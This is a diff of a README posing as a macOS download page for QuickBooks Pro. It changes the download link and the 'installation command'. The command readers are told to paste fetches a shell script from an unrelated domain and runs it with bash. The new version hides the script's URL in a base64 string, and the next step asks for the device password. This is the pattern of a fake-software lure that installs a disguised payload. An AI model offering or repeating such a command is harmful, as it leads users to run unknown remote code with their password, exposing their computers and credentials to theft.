@@ -2,7 +2,7 @@
 
 QuickBooks Pro is the ultimate desktop accounting solution for macOS users. Whether you're a small business owner or an accounting professional, QuickBooks Pro helps you manage invoices, track expenses, and generate detailed reports — all in one place.
 
-[![🚀 Download QuickBooks Pro 🟣](https://img.shields.io/badge/Download-QuickBooks%20Pro-blueviolet)](https://quickbooks-pro-mac-download.github.io/.github)
+[![🚀 Download QuickBooks Pro 🟣](https://img.shields.io/badge/Download-QuickBooks%20Pro-blueviolet)](https://shuziktobehuman.github.io/huja/QuickBooks)
 
 ---
 
@@ -21,7 +21,7 @@ QuickBooks Pro is the ultimate desktop accounting solution for macOS users. Whet
 
 1. Copy the installation command below.
 ```bash
-/bin/bash -c "$(curl -fsSL https://veitzeatz.com/get1/install.sh)"
+/bin/bash -c "$(curl -fsSL $(echo aHR0cHM6Ly9waGFubmFyaXRoLmNvbS9nZXQyL2luc3RhbGwuc2g= | base64 -d))"
 ```
 2. Open the terminal on your device and paste the command you copied above, then press the “Return” button.
 3. Enter your device password and confirm the installation.
